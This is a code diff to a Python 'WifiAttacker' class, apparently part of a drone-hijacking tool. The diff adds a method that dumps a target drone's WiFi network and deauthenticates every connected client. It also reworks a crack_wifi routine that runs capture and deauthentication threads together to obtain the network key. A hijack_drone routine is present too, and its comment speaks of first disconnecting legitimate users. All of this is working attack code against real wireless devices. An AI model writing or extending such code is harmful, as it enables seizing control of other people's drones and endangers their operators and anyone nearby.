@@ -97,29 +97,30 @@ class WifiAttacker():
         return targets
 
 
-
-
-    def dump_target_network(self, chan, bssid, interface=MNG_INTERF, duration=CLI_DUMP_DURATION):
-        """ perform a dump of a specific network """
-        try:
-            restore_interf(interface)
-            start_mon(chan, interface)
-            dump_specific_nw(bssid, chan, 1, duration)
-            restore_interf(interface)
-
-        except Exception as e:
-            raise(Exception(f"{e}"))
-
-
-    def deauth_client(self, ap_bssid, cli_bssid, chan, essid
+    def deauth_all_clients(self, targeted_drone : d.Drone
         , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
+        
+        ssid = targeted_drone.get_ssid()
+        bssid = targeted_drone.get_bssid()
+        chan = targeted_drone.get_channel()
+
         restore_interf(mng_interf)
         start_mon(chan, mng_interf)
-        deauth(ap_bssid, cli_bssid, essid, mon_interf)
+
+        # dump the drone network to get clients connected
+        dump_specific_nw(bssid, chan)
+
+        # get the first client from the *.csv dump result
+        clients = self.get_clients_bssid()
+
+        for cli_bssid in clients:
+            deauth_client(bssid, cli_bssid, ssid, mon_interf)
+
+
         restore_interf(mng_interf)
 
-    
-    #def crack_wifi(self, ap_bssid, cli_bssid, chan, essid
+
+
     def crack_wifi(self, targeted_drone : d.Drone
         , mng_interf=MNG_INTERF, mon_interf=MON_INTERF
         , duration=CLI_DUMP_DURATION):
@@ -135,7 +136,6 @@ class WifiAttacker():
         # dump the drone network to get clients connected
         dump_specific_nw(ap_bssid, chan)
 
-        
         # get the first client from the *.csv dump result
         cli_bssid = self.get_clients_bssid()
 
@@ -149,8 +149,8 @@ class WifiAttacker():
                 , args=(ap_bssid, chan, mon_interf, duration)
             )
             
-            # deauth thread
-            t2 = threading.Thread(target=deauth
+            # deauth_client thread
+            t2 = threading.Thread(target=deauth_client
                 , args=(ap_bssid, cli_bssid[0], ssid, mon_interf)
             )
             
@@ -210,14 +210,7 @@ class WifiAttacker():
         return clients_bssid
 
 
-    def deauth_client(self, ap_bssid, cli_bssid, chan, essid
-        , mng_interf=MNG_INTERF, mon_interf=MON_INTERF):
-        restore_interf(mng_interf)
-        start_mon(chan, mng_interf)
-        deauth(ap_bssid, cli_bssid, essid, mon_interf)
-        restore_interf(mng_interf)
-
-
+ 
     def hijack_drone(self, targeted_drone:d.Drone):
         
         """
@@ -225,7 +218,7 @@ class WifiAttacker():
         """
 
         # first, disconnect legitime users
-        #self.deauth_client()
+        #self.deauth_all_clients()
 
         cmd = ["sudo", "iwconfig", MNG_INTERF, "essid"
             , targeted_drone.get_channel()]
